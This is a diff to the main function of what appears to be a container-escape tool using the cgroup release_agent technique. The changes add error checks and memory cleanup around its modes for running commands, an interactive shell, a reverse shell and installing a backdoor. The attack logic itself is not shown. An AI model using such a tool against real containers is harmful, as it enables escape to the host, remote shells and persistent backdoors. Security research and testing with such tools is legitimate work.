@@ -133,12 +133,22 @@ int main(int argc, char *argv[]) {
 
             printf_wrapper(INFO, "Try to get container path in host\n");
             char *container_path_in_host = (char *) malloc(1024 * sizeof(char));
+            memset(container_path_in_host, 0x00, 1024);
             get_container_path_in_host(container_path_in_host);
+            if (*container_path_in_host == 0x00) {
+                printf_wrapper(ERROR, "Get container path in host failed\n");
+                exit(EXIT_SUCCESS);
+            }
             release_agent_attack_info.container_path_in_host = container_path_in_host;
-            escape_by_release_agent();
+            if (escape_by_release_agent() != 0) {
+                printf_wrapper(ERROR, "Escape by release_agent failed\n");
+                exit(EXIT_SUCCESS);
+            }
 
             if (attack_info.attack_mode == EXEC) {
-                release_agent_exec();
+                if (release_agent_exec() == -1) {
+                    printf_wrapper(ERROR, "Execute the command %s failed\n", attack_info.command);
+                }
             }
 
             if (attack_info.attack_mode == SHELL) {
@@ -157,17 +167,25 @@ int main(int argc, char *argv[]) {
                     }
                     inputBuffer[strcspn(inputBuffer, "\n")] = 0x00;
                     strcpy(attack_info.command, inputBuffer);
-                    release_agent_exec();
+                    if (release_agent_exec() == -1) {
+                        printf_wrapper(ERROR, "Execute the command %s failed\n", attack_info.command);
+                    }
                 }
+                free(inputBuffer);
             }
 
             if (attack_info.attack_mode == REVERSE) {
-                release_agent_reverse();
+                if (release_agent_reverse() == -1) {
+                    printf_wrapper(ERROR, "Reverse shell failed\n");
+                }
             }
 
             if (attack_info.attack_mode == BACKDOOR) {
-                release_agent_backdoor();
+                if (release_agent_backdoor() == -1) {
+                    printf_wrapper(ERROR, "Run backdoor %s failed\n", attack_info.backdoor_path);
+                }
             }
+            free(container_path_in_host);
             break;
         }
     }
